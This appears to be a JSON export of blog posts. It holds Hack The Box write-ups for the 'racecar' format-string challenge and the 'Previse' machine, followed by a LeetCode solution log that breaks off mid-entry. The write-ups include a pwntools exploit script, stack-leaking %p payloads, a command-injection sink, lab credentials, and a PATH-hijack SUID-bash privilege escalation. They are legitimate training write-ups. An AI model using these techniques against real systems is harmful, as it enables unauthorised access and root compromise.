[{"content":"Short summary:\n Here\u0026rsquo;s the challenge: racecar.zip, zip password is hackthebox Good luck writing your pwn script   So, it\u0026rsquo;s a pwn challenge. For those first-timers, basically you\u0026rsquo;re given a program that\u0026rsquo;s also being run on a server. The task is to find a flaw in that program so that you can retrieve the real flag from the server.\nThis time, we\u0026rsquo;re given a binary file named racecar. You can grab the binary and try it out yourself, since it\u0026rsquo;s a fun challenge.\nFirst things first, let\u0026rsquo;s check what\u0026rsquo;s it.\n$ file racecar racecar: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c5631a370f7704c44312f6692e1da56c25c1863c, not stripped ELF binary, not stripped - which means debugging information\u0026rsquo;s still there. So let\u0026rsquo;s find out what it has.\n$ readelf -s racecar 1 â¨¯ Symbol table \u0026#39;.dynsym\u0026#39; contains 27 entries: Num: Value Size Type Bind Vis Ndx Name 0: 00000000 0 NOTYPE LOCAL DEFAULT UND 1: 00000000 0 FUNC GLOBAL DEFAULT UND strcmp@GLIBC_2.0 (2) 2: 00000000 0 FUNC GLOBAL DEFAULT UND read@GLIBC_2.0 (2) 3: 00000000 0 NOTYPE WEAK DEFAULT UND _ITM_deregisterT[...] 4: 00000000 0 FUNC GLOBAL DEFAULT UND printf@GLIBC_2.0 (2) 5: 00000000 0 FUNC GLOBAL DEFAULT UND fgets@GLIBC_2.0 (2) 6: 00000000 0 FUNC GLOBAL DEFAULT UND time@GLIBC_2.0 (2) 7: 00000000 0 FUNC GLOBAL DEFAULT UND sleep@GLIBC_2.0 (2) 8: 00000000 0 FUNC GLOBAL DEFAULT UND alarm@GLIBC_2.0 (2) 9: 00000000 0 FUNC GLOBAL DEFAULT UND __[...]@GLIBC_2.4 (3) 10: 00000000 0 FUNC WEAK DEFAULT UND [...]@GLIBC_2.1.3 (4) 11: 00000000 0 FUNC GLOBAL DEFAULT UND malloc@GLIBC_2.0 (2) 12: 00000000 0 FUNC GLOBAL DEFAULT UND puts@GLIBC_2.0 (2) 13: 00000000 0 NOTYPE WEAK DEFAULT UND __gmon_start__ 14: 00000000 0 FUNC GLOBAL DEFAULT UND exit@GLIBC_2.0 (2) ... # and a lot more so I\u0026#39;ll just skip straight to needed part 84: 00000000 0 OBJECT GLOBAL DEFAULT UND stdout@@GLIBC_2.0 85: 00004010 0 NOTYPE GLOBAL DEFAULT 24 __bss_start 86: 000013e1 168 FUNC GLOBAL DEFAULT 14 main 87: 00004008 4 OBJECT GLOBAL DEFAULT 23 coins 88: 00001500 20 FUNC GLOBAL HIDDEN 14 __stack_chk_fail[...] 89: 0000400c 4 OBJECT GLOBAL DEFAULT 23 check 90: 00000000 0 FUNC GLOBAL DEFAULT UND atoi@@GLIBC_2.0 91: 00004010 0 OBJECT GLOBAL HIDDEN 23 __TMC_END__ 92: 00000000 0 NOTYPE WEAK DEFAULT UND _ITM_registerTMC[...] 93: 00000618 0 FUNC GLOBAL DEFAULT 11 _init 94: 00001082 336 FUNC GLOBAL DEFAULT 14 info 95: 00000b93 111 FUNC GLOBAL DEFAULT 14 setup See that main function? We go there. :D\nHere\u0026rsquo;s what I\u0026rsquo;d got in Ghidra:\n/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */ void main(void) { int iVar1; int iVar2; int in_GS_OFFSET; iVar1 = *(int *)(in_GS_OFFSET + 0x14); setup(); banner(); info(); while (check != 0) { iVar2 = menu(); if (iVar2 == 1) { car_info(); } else { if (iVar2 == 2) { check = 0; car_menu(); } else { printf(\u0026#34;\\n%s[-] Invalid choice!%s\\n\u0026#34;,\u0026amp;DAT_00011548,\u0026amp;DAT_00011538); } } } if (iVar1 != *(int *)(in_GS_OFFSET + 0x14)) { __stack_chk_fail_local(); } return; } Already got the rough idea? I\u0026rsquo;ve checked car_info() and some other functions, but seems like car_menu() is the only one has some interesting bits to it. Here\u0026rsquo;s it:\n/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */ void car_menu(void) { int iVar1; int iVar2; uint __seed; int iVar3; size_t sVar4; char *__format; FILE *__stream; int in_GS_OFFSET; undefined *puVar5; undefined4 uVar6; undefined4 uVar7; uint local_54; char local_3c [44]; int local_10; local_10 = *(int *)(in_GS_OFFSET + 0x14); uVar6 = 0xffffffff; uVar7 = 0xffffffff; do { printf(\u0026amp;DAT_00011948); iVar1 = read_int(uVar6,uVar7); if ((iVar1 != 2) \u0026amp;\u0026amp; (iVar1 != 1)) { printf(\u0026#34;\\n%s[-] Invalid choice!%s\\n\u0026#34;,\u0026amp;DAT_00011548,\u0026amp;DAT_00011538); } } while ((iVar1 != 2) \u0026amp;\u0026amp; (iVar1 != 1)); iVar2 = race_type(); __seed = time((time_t *)0x0); srand(__seed); if (((iVar1 == 1) \u0026amp;\u0026amp; (iVar2 == 2)) || ((iVar1 == 2 \u0026amp;\u0026amp; (iVar2 == 2)))) { iVar2 = rand(); iVar2 = iVar2 % 10; iVar3 = rand(); iVar3 = iVar3 % 100; } else { if (((iVar1 == 1) \u0026amp;\u0026amp; (iVar2 == 1)) || ((iVar1 == 2 \u0026amp;\u0026amp; (iVar2 == 1)))) { iVar2 = rand(); iVar2 = iVar2 % 100; iVar3 = rand(); iVar3 = iVar3 % 10; } else { iVar2 = rand(); iVar2 = iVar2 % 100; iVar3 = rand(); iVar3 = iVar3 % 100; } } local_54 = 0; while( true ) { sVar4 = strlen(\u0026#34;\\n[*] Waiting for the race to finish...\u0026#34;); if (sVar4 \u0026lt;= local_54) break; putchar((int)\u0026#34;\\n[*] Waiting for the race to finish...\u0026#34;[local_54]); if (\u0026#34;\\n[*] Waiting for the race to finish...\u0026#34;[local_54] == \u0026#39;.\u0026#39;) { sleep(0); } local_54 = local_54 + 1; } if (((iVar1 == 1) \u0026amp;\u0026amp; (iVar2 \u0026lt; iVar3)) || ((iVar1 == 2 \u0026amp;\u0026amp; (iVar3 \u0026lt; iVar2)))) { printf(\u0026#34;%s\\n\\n[+] You won the race!! You get 100 coins!\\n\u0026#34;,\u0026amp;DAT_00011540); coins = coins + 100; puVar5 = \u0026amp;DAT_00011538; printf(\u0026#34;[+] Current coins: [%d]%s\\n\u0026#34;,coins,\u0026amp;DAT_00011538); printf(\u0026#34;\\n[!] Do you have anything to say to the press after your big victory?\\n\u0026gt; %s\u0026#34;, \u0026amp;DAT_000119de); __format = (char *)malloc(0x171); __stream = fopen(\u0026#34;flag.txt\u0026#34;,\u0026#34;r\u0026#34;); if (__stream == (FILE *)0x0) { printf(\u0026#34;%s[-] Could not open flag.txt. Please contact the creator.\\n\u0026#34;,\u0026amp;DAT_00011548,puVar5); /* WARNING: Subroutine does not return */ exit(0x69); } fgets(local_3c,0x2c,__stream); read(0,__format,0x170); puts( \u0026#34;\\n\\x1b[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: \\x1b[0m\u0026#34; ); printf(__format); } else { if (((iVar1 == 1) \u0026amp;\u0026amp; (iVar3 \u0026lt; iVar2)) || ((iVar1 == 2 \u0026amp;\u0026amp; (iVar2 \u0026lt; iVar3)))) { printf(\u0026#34;%s\\n\\n[-] You lost the race and all your coins!\\n\u0026#34;,\u0026amp;DAT_00011548); coins = 0; printf(\u0026#34;[+] Current coins: [%d]%s\\n\u0026#34;,0,\u0026amp;DAT_00011538); } } if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) { __stack_chk_fail_local(); } return; } You can carefully examine it for studying purpose, but to keep it short, basically it\u0026rsquo;s:\n If you choose car 1 and race 2, or car 2 and race 1, you win When you win, it let you input something there, and print it back out  Here\u0026rsquo;s what would happen: Now that we\u0026rsquo;ve known what this program does, how to exploit it?\nSee this little, cute command somewhere on the 82th line of car_menu() function? :D\nprintf(__format); Yeah, as clear as day, a format string vulnerability!\nTry to insert a payload there:\n[!] Do you have anything to say to the press after your big victory? \u0026gt; %x%x The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: 57916200170 Well, it\u0026rsquo;s vulnerable.\nSince it\u0026rsquo;s quite troublesome to enter our payload each time, here\u0026rsquo;s an on-the-spot Python script to make our life easier. :D\n#!/usr/bin/env python3 from pwn import * context.log_level = \u0026#39;ERROR\u0026#39; def exploit(payload: str): conn = process(\u0026#39;./racecar\u0026#39;) conn.sendlineafter(b\u0026#39;Name\u0026#39;, b\u0026#39;aki\u0026#39;) conn.sendlineafter(b\u0026#39;Nickname\u0026#39;, b\u0026#39;aki\u0026#39;) conn.sendlineafter(b\u0026#39;selection\u0026#39;, b\u0026#39;2\u0026#39;) conn.sendlineafter(b\u0026#39;car\u0026#39;, b\u0026#39;1\u0026#39;) conn.sendlineafter(b\u0026#39;Circuit\u0026#39;, b\u0026#39;2\u0026#39;) conn.sendlineafter(b\u0026#39;victory?\u0026#39;, bytes(payload, encoding=\u0026#39;utf-8\u0026#39;)) conn.recv() print(conn.recv().decode(\u0026#39;utf-8\u0026#39;)) conn.close() if __name__ == \u0026#39;__main__\u0026#39;: while True: exploit(input(\u0026#39;Enter payload: \u0026#39;)) I also created a flag.txt contains only AAAA, since that\u0026rsquo;ll be 41414141 in hex - much easier to spot.\n[!] Do you have anything to say to the press after your big victory? \u0026gt; %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: 0x568e4200 0x170 0x565c8d85 0x5 0x4c 0x26 0x1 0x2 0x565c996c 0x568e4200 0x568e4380 0x41414141 0xa414141 0xf7db0100 0xaf7cc300 0x565c9d58 0x565cbf8c 0xffda98c8 0x565c938d 0x565c9540 It\u0026rsquo;s the 12th! Now, do just the same with the server, we get:\n0x574361c0 0x170 0x56555d85 0x1 0x5e 0x26 0x1 0x2 0x5655696c 0x574361c0 0x57436340 0x7b425448 0x5f796877 0x5f643164 0x34735f31 0x745f3376 0x665f3368 0x5f67346c 0x745f6e30 0x355f3368 0x6b633474 0x7d213f 0xf149d800 0xf7f9e3fc 0x56558f8c 0xfffe9b38 0x56556441 0x1 0xfffe9be4 0xfffe9bec It doesn\u0026rsquo;t make much sense, does it? So let\u0026rsquo;s spin up another convenient script:\n#!/usr/bin/env python3 import re raw_flag = input(\u0026#34;Enter the raw data: \u0026#34;) raw_flag = raw_flag.split()[::-1] for i in range(len(raw_flag)): raw_flag[i] = re.findall(\u0026#39;..\u0026#39;, raw_flag[i]) flag = [char for char in raw_flag] answer = [] for chars in flag: word = \u0026#34;\u0026#34; for char in chars[::-1]: if char != \u0026#39;0x\u0026#39;: word += chr(int(char, 16)) answer.append(word) answer.reverse() print(\u0026#39;\u0026#39;.join(answer)) Since it\u0026rsquo;s not a piece of cake to filter out which bytes are meaningful, let\u0026rsquo;s just plug all retrieved data to the script, and whatever gibberish it yield out must contain our flag!\nIn case you\u0026rsquo;re curious, here\u0026rsquo;s that gibberish:\n]UV^\u0026amp;liUVÃaCW@cCWHTB{why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck?!}ÃIÃ±Ã¼Ã£Ã¹Ã·UV8dUVÃ¤ See our flag in the middle? :D\nAnd that\u0026rsquo;s it. Nice challenge!\n","permalink":"https://git-akihakune.github.io/blog/racecar/","summary":"A writeup for Hack The Box\u0026rsquo;s racecar pwn challenge","title":"Hack The Box Pwn challenge - racecar"},{"content":"I. Foothold It all began with a port scan:\n# Nmap 7.92 scan initiated Mon Dec 6 22:10:41 2021 as: nmap -sC -sV -oN nmap.txt 10.10.11.104 Nmap scan report for 10.10.11.104 Host is up (0.64s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA) | 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA) |_ 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519) 80/tcp open http? | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set | http-title: Previse Login |_Requested resource was login.php Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Dec 6 22:13:13 2021 -- 1 IP address (1 host up) scanned in 151.40 seconds I also ran a quick RustScan and set up a background nmap full ports scan, but seems like those 2 are the only ports opening. Also, since their version seems up-to-date (at the time of writing), looks like there\u0026rsquo;s no better attack vector than the web application.\nWe\u0026rsquo;re greeted with this basic login form upon opening it in a web browser.\nTo be honest, the first time I got there, someone\u0026rsquo;d already pwned the system, and I easily managed to login using admin:admin. Not until I\u0026rsquo;d got the box and getting round to write this writeup that I belatedly realized: hell, it should not have been that straight-forward. So it took me about half an hour more to figure out the proper way to log in.\nChecking browser\u0026rsquo;s DevTool, we can clearly see that it just simply redirect us to login page if we\u0026rsquo;re not logged in.\nSo I fired up Burp Suite, intercepted the responses, change status from 302 Redirect to 200 OK, and I got in.\nAround this time, Gobuster returned with quite positive results:\nâââ(kaliã¿kali)-[~/ctf/htb/Previse] ââ$ gobuster dir -x php -u http://10.10.11.104 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.104 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: php [+] Timeout: 10s =============================================================== 2021/12/07 23:13:31 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 302) [Size: 2801] [--\u0026gt; login.php] /download.php (Status: 302) [Size: 0] [--\u0026gt; login.php] /login.php (Status: 200) [Size: 2224] /files.php (Status: 302) [Size: 4914] [--\u0026gt; login.php] /header.php (Status: 200) [Size: 980] /nav.php (Status: 200) [Size: 1248] /footer.php (Status: 200) [Size: 217] ... I manually checked all Status: 200 pages, and nav.php looked really promising.\nI reckoned that\u0026rsquo;s to render the navigation bar, along with header.php and footer.php.\nUsing the same Burp Suite technique, I got to Account and create an account of myself (later I realized that I didn\u0026rsquo;t need to, and shouldn\u0026rsquo;t have done that, since it\u0026rsquo;ll leave traces in the database, and in real-world scenarios, getting caught like that is not good).\nAfter logged in, we can download uploaded files of other users. And an user uploaded something that looks like the source code of this web app.\nBefore reading any further, you can try to grab the source code, and try to figure out the vulnerability by yourself!\n\u0026hellip;\nHave you done that? What\u0026rsquo;s the vulnerability? How long did it take?\nI reckon we all got the database credentials in config.php pretty quick:\n\u0026lt;?php function connectDB(){ $host = \u0026#39;localhost\u0026#39;; $user = \u0026#39;root\u0026#39;; $passwd = \u0026#39;mySQL_p@ssw0rd!:)\u0026#39;; $db = \u0026#39;previse\u0026#39;; $mycon = new mysqli($host, $user, $passwd, $db); return $mycon; } ?\u0026gt;However, it took me half an hour to stumble upon this line in logs.php:\n$output = exec(\u0026#34;/usr/bin/python /opt/scripts/log_process.py {$_POST[\u0026#39;delim\u0026#39;]}\u0026#34;); With no validation whatsover, there\u0026rsquo;s a great chance that it\u0026rsquo;s a command execution vulnerability via POST request.\nAnd so, I got back to Burp Suite, intercepted the request, sent it to repeater, trial and error (I mean, a lot of attempts), and finally got a reverse shell back.\nAs expected, the reverse shell returned was owned by www-data which didn\u0026rsquo;t provide much privilege. However, since we\u0026rsquo;d already had the MySQL database credentials, it\u0026rsquo;s not hard to get all the password hashes.\n+----+------------+------------------------------------+ | id | username | password | +----+------------+------------------------------------+ | 1 | m4lwhere | $1$ð§llol$DQpmdvnb7EeuO6UaqRItf. | | 2 | ouiouioui | $1$ð§llol$bwR0QWQ73nPRaUpx0r2la1 | | 3 | cacapipi | $1$ð§llol$oQSn/sA4G3L1zmOigOBq6. | | 4 | peter | $1$ð§llol$.nhVJJDzQaIk8znez4dDH/ | | 5 | jappoo | $1$ð§llol$JeN.ad9Ib9Gi/B.zMvpEm/ | | 6 | hacker | $1$ð§llol$MHiYle9peb0qOKtGJWZ9S0 | | 7 | noobie | $1$ð§llol$QJyUxlZ0gphAKveVeBYGk. | | 8 | fignupafya | $1$ð§llol$sP8qi2I.K6urjPuzdGizl1 | | 9 | lmaolmao | $1$ð§llol$bT7q8rEMWewT0sa2T6FOx0 | +----+------------+------------------------------------+ Also, take a look at /etc/passwd, we have:\nroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sshd:x:110:65534::/run/sshd:/usr/sbin/nologin m4lwhere:x:1000:1000:m4lwhere:/home/m4lwhere:/bin/bash mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false So our target should be m4lwhere user.\nAt this point, let\u0026rsquo;s just run John the Ripper (which I personally prefer over Hashcat, since configuring hardware things for hashcat in a virtual environment is quite daunting), and we\u0026rsquo;d got m4lwhere password.\nII. Privilege Escalation Logging in SSH with the credentials of m4lwhere, we\u0026rsquo;d got the user flag. Now it\u0026rsquo;s time for vertical privilege escalation!\nAfter some basic recons, this looks like the best shot we could have:\nm4lwhere@previse:~$ sudo -l [sudo] password for m4lwhere: User m4lwhere may run the following commands on previse: (root) /opt/scripts/access_backup.sh So let\u0026rsquo;s go for it!\nm4lwhere@previse:~$ cat /opt/scripts/access_backup.sh #!/bin/bash # We always make sure to store logs, we take security SERIOUSLY here # I know I shouldnt run this as root but I cant figure it out programmatically on my account # This is configured to run with cron, added to sudo so I can run as needed - we\u0026#39;ll fix it later when there\u0026#39;s time gzip -c /var/log/apache2/access.log \u0026gt; /var/backups/$(date --date=\u0026#34;yesterday\u0026#34; +%Y%b%d)_access.gz gzip -c /var/www/file_access.log \u0026gt; /var/backups/$(date --date=\u0026#34;yesterday\u0026#34; +%Y%b%d)_file_access.gz Can you spot the vulnerability? Are we seeing eye to eye, or looking at different things? :D\nI\u0026rsquo;ve to admit, at first, I digged deep into the date hole. date binary can provide file read access, so I struggled to change the system date to my payload, without-root-access. It was pure hell. After giving up on it, I took another look at access_backup.sh and, god, why was I so blind about that relative gzip? What about path injection?\nAt first, I tried to directly execute /bin/bash through that injection, but it didn\u0026rsquo;t work. So I tried a a workaround.\nI copied bash to home, made a bash script that set SUID and change user of that binary, change PATH to inject it, and got root. Here\u0026rsquo;s the script.\n#!/usr/bin/bash chown root:root bash chmod +s bash The whole process can be described as:\nm4lwhere@previse:~$ cp /bin/bash ~ m4lwhere@previse:~$ mv script.sh ~/gzip m4lwhere@previse:~$ export $PATH=/home/m4lwhere:$PATH m4lwhere@previse:~$ sudo /opt/scripts/access_backup.sh m4lwhere@previse:~$ bash -p root@previse:/home/m4lwhere$ And that\u0026rsquo;s it. The root flag! Don\u0026rsquo;t forget to clean up your traces, for practicing purposes and for later players, everyone. :D\n","permalink":"https://git-akihakune.github.io/blog/previse/","summary":"A writeup for Hack The Box - Previse machine","title":"Hack The Box - Previse writeup"},{"content":"These are my submissions from Leetcode, started from knowing nothing about advanced data structures and algorithms (and still is).\nRather than to show off my code, this article is more like a progress revision for my algo journey. Therefore, it\u0026rsquo;ll be regularly updated.\nWho knows, maybe after months of 40 hours a day practicing, I will take a look back and find out how sacrilegious my code once was. :D\nStarting point: 14 days study plan to crack algo First day: 704. Binary Search Accepted Python code:\nclass Solution: def search(self, nums: List[int], target: int) -\u0026gt; int: high = len(nums) low = 0 mid = (low + high) // 2 while low \u0026lt; high: mid = (low + high) // 2 if nums[mid] != target and nums[mid] \u0026lt; target: low = mid + 1 elif nums[mid] != target and nums[mid] \u0026gt; target: high = mid else: return mid return mid if nums[mid] == target else -1 Accepted C++ code:\nclass Solution { public: int search(vector\u0026lt;int\u0026gt;\u0026amp; nums, int target) { int high = nums.size(), low = 0; int mid = (high + low) / 2; while (low \u0026lt; high) { mid = (high + low) / 2; if (nums[mid] \u0026lt; target) low = mid + 1; else if (nums[mid] \u0026gt; target) high = mid; else return mid; } return -1; } }; First day: 278. First Bad version Accepted Python solution:\n# The isBadVersion API is already defined for you. # @param version, an integer # @return an integer # def isBadVersion(version): class Solution: def firstBadVersion(self, n): \u0026#34;\u0026#34;\u0026#34; :type n: int :rtype: int \u0026#34;\u0026#34;\u0026#34; high: int = n low: int = 1 mid: int = low + (high - low) // 2 while low \u0026lt; high: mid = low + (high - low) // 2 if isBadVersion(mid): high = mid else: low = mid + 1 return low Accepted C++ solution:\n// The API isBadVersion is defined for you. // bool isBadVersion(int version);  class Solution { public: int firstBadVersion(int n) { int high = n, low = 1; int mid = low + (high - low) / 2; while (low \u0026lt; high) { mid = low + (high - low) / 2; if (isBadVersion(mid)) high = mid; else low = mid + 1; } return low; } }; First day: 35. Search Insert Position Accepted C++ solution:\nclass Solution { public: int searchInsert(vector\u0026lt;int\u0026gt;\u0026amp; nums, int target) { int high = nums.size(), low = 0; int mid; while (low \u0026lt; high) { mid = low + (high - low) / 2; if (nums[mid] \u0026lt; target) low = mid + 1; else high = mid; } return high; } }; Another accepted C++ solution, but took 9 ms more:\nclass Solution { public: int searchInsert(vector\u0026lt;int\u0026gt;\u0026amp; nums, int target) { return lower_bound(nums.begin(), nums.end(), target) - nums.begin(); } }; Accepted Python solution:\nclass Solution: def searchInsert(self, nums: List[int], target: int) -\u0026gt; int: high: int = len(nums) low: int = 0 while low \u0026lt; high: mid = (low + high) // 2 if nums[mid] \u0026lt; target: low = mid + 1 else: high = mid return high This one ran slower, while taking less space:\nclass Solution: def searchInsert(self, nums: List[int], target: int) -\u0026gt; int: return bisect_left(nums, target) Even though they are practically the same algorithm\u0026hellip; How could it be??\nDay 2: 977. Squares of a Sorted Array Accepted Python solution:\nclass Solution: def sortedSquares(self, nums: List[int]) -\u0026gt; List[int]: # Handling edge case if not len(nums) \u0026gt; 3: return sorted([i*i for i in nums]) # Set dead end on a side MAX_INTERGER_VALUE: int = 10**4 nums.append(MAX_INTERGER_VALUE + 1) # Get the position of the number # that\u0026#39;s nearest to 0 zeroPosition = bisect_right(nums, 0) left: int = zeroPosition - 1 right: int = zeroPosition answer = [] while left \u0026gt;= 0 or right \u0026lt; len(nums): if abs(nums[left]) \u0026lt; abs(nums[right]): answer.append(nums[left]**2) left -= 1 else: answer.append(nums[right]**2) right += 1 if left == -1 and right + 1 == len(nums): answer.append(nums[right]**2) break if right == len(nums) and left == 0: answer.append(nums[left]**2) break return answer[:-1] Another one, ran faster while taking 2KB more space:\nclass Solution: def sortedSquares(self, nums: List[int]) -\u0026gt; List[int]: return sorted([i*i for i in nums]) WHY???\nHere\u0026rsquo;s my first C++ solution:\nclass Solution { public: vector\u0026lt;int\u0026gt; sortedSquares(vector\u0026lt;int\u0026gt;\u0026amp; nums) { // Get index of first positive number  int firstPositiveNumber = 0; while (firstPositiveNumber \u0026lt; nums.size() \u0026amp;\u0026amp; nums.at(firstPositiveNumber) \u0026lt; 0) ++firstPositiveNumber; int negative = firstPositiveNumber - 1, positive = firstPositiveNumber; vector\u0026lt;int\u0026gt; answer; while (negative \u0026gt;= 0 \u0026amp;\u0026amp; positive \u0026lt; nums.size()) { if (nums.at(negative) * -1 \u0026lt; nums.at(positive)) { answer.push_back(nums.at(negative) * nums.at(negative)); --negative; } else { answer.push_back(nums.at(positive) * nums.at(positive)); ++positive; } } while (negative \u0026gt;= 0) { answer.push_back(nums.at(negative) * nums.at(negative)); --negative; } while (positive \u0026lt; nums.size()) { answer.push_back(nums.at(positive) * nums.at(positive)); ++positive; } return answer; } }; Another C++ one:\nclass Solution { public: vector\u0026lt;int\u0026gt; sortedSquares(vector\u0026lt;int\u0026gt;\u0026amp; nums) { int left = 0, right = nums.size() - 1; vector\u0026lt;int\u0026gt; answer(nums.size(), 0); for (int i = nums.size() - 1; i \u0026gt;= 0; --i) { if (abs(nums[left]) \u0026lt; abs(nums[right])) { answer.at(i) = nums[right] * nums[right]; right -= 1; } else { answer[i] = nums[left] * nums[left]; left += 1; } } return answer; } }; And another one, far more superior:\nclass Solution { public: vector\u0026lt;int\u0026gt; sortedSquares(vector\u0026lt;int\u0026gt;\u0026amp; nums) { transform(nums.begin(), nums.end(), nums.begin(), [](int f){return f*f;}); sort(nums.begin(), nums.end()); return nums; } }; At this rate, I\u0026rsquo;ve eventually given up haphazardly trust big O notation. ;-;\nDay 2: 189. Rotate Array Accepted Python solution:\nclass Solution: def rotate(self, nums: List[int], k: int) -\u0026gt; None: \u0026#34;\u0026#34;\u0026#34; Do not return anything, modify nums in-place instead. \u0026#34;\u0026#34;\u0026#34; nums[:] = nums[-k % len(nums):] + nums[:-k % len(nums)] Accepted C++ solution:\nclass Solution { public: void rotate(vector\u0026lt;int\u0026gt;\u0026amp; nums, int k) { // reverse method  k %= nums.size(); reverse(nums.begin(), nums.end()); reverse(nums.begin(), nums.begin() + k); reverse(nums.begin() + k, nums.end()); } }; It was the moment writing this article that I realized - I was supposed to use 2 pointers method! Guess let\u0026rsquo;s just save that for later then. :D\nDay 3: 283. Move Zeroes Here are 2 different solutions, written in Python:\nclass Solution: def moveZeroes(self, nums: List[int]) -\u0026gt; None: \u0026#34;\u0026#34;\u0026#34; Do not return anything, modify nums in-place instead. \u0026#34;\u0026#34;\u0026#34; lastNonZeroIndex: int = 0 for i in nums: if i: nums[lastNonZeroIndex] = i lastNonZeroIndex += 1 for i in range(lastNonZeroIndex, len(nums)): nums[i] = 0 class Solution: def moveZeroes(self, nums: List[int]) -\u0026gt; None: \u0026#34;\u0026#34;\u0026#34; Do not return anything, modify nums in-place instead. \u0026#34;\u0026#34;\u0026#34; lastNonZeroIndex: int = 0 for i in range(len(nums)): if nums[i]: nums[lastNonZeroIndex], nums[i] = nums[i], nums[lastNonZeroIndex] lastNonZeroIndex += 1 They are both O(n) in terms of time complexity, and O(1) in space complexity, so there\u0026rsquo;s not much comparison though.\nC++ implementation for the second solution:\nclass Solution { public: void moveZeroes(vector\u0026lt;int\u0026gt;\u0026amp; nums) { int lastNonZeroIndex = 0; for (int i = 0; i \u0026lt; nums.size(); ++i) { if (nums[i]) swap(nums[lastNonZeroIndex++], nums[i]); } } }; Day 3: 167. Two Sum II - Input Array is Sorted This bruteforce solution got Time Limit Exceeded:\nclass Solution { public: vector\u0026lt;int\u0026gt; twoSum(vector\u0026lt;int\u0026gt;\u0026amp; numbers, int target) { vector\u0026lt;int\u0026gt; ans; for (int i = 0; i + 1 \u0026lt; numbers.size(); ++i) { int left = i, right = numbers.size() - 1; while (left \u0026lt; right \u0026amp;\u0026amp;\\ numbers.at(left) + numbers.at(right) \u0026gt;= target) { if (numbers.at(left) + numbers.at(right) == target) { ans.insert(ans.end(), {left + 1, right + 1}); return ans; } --right; } } return ans; } }; Accepted C++ solution:\nclass Solution { public: vector\u0026lt;int\u0026gt; twoSum(vector\u0026lt;int\u0026gt;\u0026amp; numbers, int target) { int left = 0, right = numbers.size() - 1; vector\u0026lt;int\u0026gt; ans; while (left \u0026lt; right) { int currentSum = numbers.at(left) + numbers.at(right); if (currentSum == target) { ans.insert(ans.end(), {left + 1, right + 1}); break; } else if (currentSum \u0026gt; target) { --right; } else { ++left; } } return ans; } }; Python line-to-line convertion of that exact piece of code:\nclass Solution: def twoSum(self, numbers: List[int], target: int) -\u0026gt; List[int]: left, right = 0, len(numbers) - 1 answer: List[int] = [] while left \u0026lt; right: currentSum: int = numbers[left] + numbers[right] if currentSum == target: answer.extend([left + 1, right + 1]) break elif currentSum \u0026gt; target: right -= 1 else: left += 1 return answer Day 4: 344. Reverse String Nothing much, just swap them in-place, and there\u0026rsquo;re built-in functions for that. Here\u0026rsquo;s C++ solution:\nclass Solution { public: void reverseString(vector\u0026lt;char\u0026gt;\u0026amp; s) { reverse(s.begin(), s.end()); } }; And Python implementation:\nclass Solution: def reverseString(self, s: List[str]) -\u0026gt; None: \u0026#34;\u0026#34;\u0026#34; Do not return anything, modify s in-place instead. \u0026#34;\u0026#34;\u0026#34; s.reverse() Day 4: 557. Reverse Words in a String III Still 